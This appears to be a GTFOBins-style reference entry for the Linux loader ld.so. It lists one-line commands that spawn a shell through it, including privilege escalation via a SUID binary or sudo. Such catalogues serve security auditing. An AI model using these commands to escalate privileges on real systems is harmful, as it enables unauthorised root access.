---
description: |
  `ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:

  ```
  $ strings /proc/self/exe | head -1
  /lib64/ld-linux-x86-64.so.2
  ```
functions:
  execute-interactive:
    - code: /lib/ld.so /bin/sh
  suid-enabled:
    - code: ./ld.so /bin/sh -p
  sudo-enabled:
    - code: sudo /lib/ld.so /bin/sh
---
